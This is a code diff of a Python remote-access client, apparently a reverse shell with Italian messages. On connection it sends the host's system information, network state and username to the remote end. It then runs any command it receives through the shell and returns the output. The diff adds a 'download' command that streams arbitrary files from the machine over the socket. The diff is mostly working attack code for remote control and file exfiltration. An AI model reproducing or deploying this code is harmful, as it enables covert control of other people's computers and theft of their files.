@@ -24,37 +24,37 @@ def connect():
 
 def setup_windows(connectionSocket):
 
-    connectionSocket.send(command("systeminfo").encode(encoding='latin-1'))
-    connectionSocket.send(command("ipconfig").encode(encoding='latin-1'))
-    connectionSocket.send(command("getmac").encode(encoding='latin-1'))
-    connectionSocket.send(command("netstat -p TCP").encode(encoding='latin-1'))
-    connectionSocket.send(command("netstat -p UDP").encode(encoding='latin-1'))
+    connectionSocket.send(command("systeminfo").encode(encoding='utf-8'))
+    connectionSocket.send(command("ipconfig").encode(encoding='utf-8'))
+    connectionSocket.send(command("getmac").encode(encoding='utf-8'))
+    connectionSocket.send(command("netstat -p TCP").encode(encoding='utf-8'))
+    connectionSocket.send(command("netstat -p UDP").encode(encoding='utf-8'))
 
 
 
 def setup_linux(connectionSocket):
 
-    connectionSocket.send(command("cat /etc/machine-id ").encode(encoding='latin-1'))
-    connectionSocket.send(command("cat /etc/os-release").encode(encoding='latin-1'))
-    connectionSocket.send(command("cat /proc/meminfo ").encode(encoding='latin-1'))
-    connectionSocket.send(command("cat /proc/cpuinfo ").encode(encoding='latin-1'))
+    connectionSocket.send(command("cat /etc/machine-id ").encode(encoding='utf-8'))
+    connectionSocket.send(command("cat /etc/os-release").encode(encoding='utf-8'))
+    connectionSocket.send(command("cat /proc/meminfo ").encode(encoding='utf-8'))
+    connectionSocket.send(command("cat /proc/cpuinfo ").encode(encoding='utf-8'))
 
-    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))    
-    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
-    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
-    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
-    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
-    connectionSocket.send(command("id").encode(encoding='latin-1'))
+    connectionSocket.send(command("lscpu").encode(encoding='utf-8'))    
+    connectionSocket.send(command("lshw").encode(encoding='utf-8'))
+    connectionSocket.send(command("ifconfig").encode(encoding='utf-8'))
+    connectionSocket.send(command("netstat -t").encode(encoding='utf-8'))
+    connectionSocket.send(command("netstat -u").encode(encoding='utf-8'))
+    connectionSocket.send(command("id").encode(encoding='utf-8'))
 
 
 def setup_mac(connectionSocket):
 
-    connectionSocket.send(command("lscpu").encode(encoding='latin-1'))
-    connectionSocket.send(command("lshw").encode(encoding='latin-1'))
-    connectionSocket.send(command("ifconfig").encode(encoding='latin-1'))
-    connectionSocket.send(command("netstat -t").encode(encoding='latin-1'))
-    connectionSocket.send(command("netstat -u").encode(encoding='latin-1'))
-    connectionSocket.send(command("id").encode(encoding='latin-1'))
+    connectionSocket.send(command("lscpu").encode(encoding='utf-8'))
+    connectionSocket.send(command("lshw").encode(encoding='utf-8'))
+    connectionSocket.send(command("ifconfig").encode(encoding='utf-8'))
+    connectionSocket.send(command("netstat -t").encode(encoding='utf-8'))
+    connectionSocket.send(command("netstat -u").encode(encoding='utf-8'))
+    connectionSocket.send(command("id").encode(encoding='utf-8'))
 
 
 
@@ -64,8 +64,8 @@ def setup(connectionSocket):
     system = platform.system()
     os.chdir(Path.home())
 
-    connectionSocket.send(system.encode(encoding='latin-1'))
-    connectionSocket.send(getpass.getuser().encode(encoding='latin-1'))
+    connectionSocket.send(system.encode(encoding='utf-8'))
+    connectionSocket.send(getpass.getuser().encode(encoding='utf-8'))
 
 
     if system == 'Windows':
@@ -77,7 +77,7 @@ def setup(connectionSocket):
     if system == 'Darwin':
         setup_mac(connectionSocket)
 
-    connectionSocket.send("uscita".encode(encoding='latin-1'))
+    connectionSocket.send("uscita".encode(encoding='utf-8'))
     
 
 
@@ -91,12 +91,29 @@ def command(cmd):
 
     else:
             
-        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='latin-1').stdout
+        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, encoding='utf-8').stdout
 
         if result == '':
             result = "comando non valido\n"
 
     return result
+
+
+def download(fileName, connectionSocket):
+
+    try:
+        file = open(fileName, "rb")
+        data = file.read(1024)
+
+        while data:
+            connectionSocket.send(data)
+            data = file.read(1024)
+
+        file.close()
+
+    except:
+        connectionSocket.send("Errore durante l' invio del file".encode(encoding='utf-8'))
+
 
 
 def main():
@@ -109,18 +126,20 @@ def main():
 
     while True:
         try:
-            cmd = connectionSocket.recv(1048576).decode(encoding='latin-1')
+            cmd = connectionSocket.recv(1048576).decode(encoding='utf-8')
             
             if cmd == "esc":
                 break
 
-            result = command(cmd)
+            if cmd.startswith("download"):
+                download(cmd[9:], connectionSocket)
+                connectionSocket.send(b'esc')
+                continue
+
+            connectionSocket.send(command(cmd).encode(encoding='utf-8'))
 
         except:
-            result = "Errore\n"
-
-        finally:
-            connectionSocket.send(result.encode(encoding='latin-1'))
+            connectionSocket.send("Errore\n".encode(encoding='utf-8'))
 
 
     clientSocket.close()
